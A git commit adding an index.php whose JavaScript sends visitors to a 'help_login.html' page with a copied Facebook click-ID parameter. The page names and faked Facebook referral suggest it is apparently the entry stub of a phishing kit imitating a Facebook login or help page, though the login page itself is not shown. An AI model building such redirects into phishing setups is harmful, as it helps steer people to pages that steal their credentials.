e9217abb5d2cfa86a0ae6dfe407b2b7cc8a53570
mainananakj <mainananakj@gmail.com>
2021-08-13 16:53:55 +0700

    terserah

---
+++ index.php
@@ -0,0 +1,17 @@
+<body>
+<script language='JavaScript' type='text/javascript'>
+<!--
+if  (screen.width > 1024){
+ setTimeout("window.location='help_login.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/'");
+
+ } else if (screen.width < 640){
+ setTimeout("window.location='help_login.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/'");
+
+} else { 
+ setTimeout("window.location='help_login.html.html?fbclid=IwAR0DpHzyMmR9Q1m8hvlX3O_FU5ALkroRy_qhIzhAXWrn13ldVn_3Y1SQfjo/'");
+}
+
+
+//-->
+</script>
+</body>
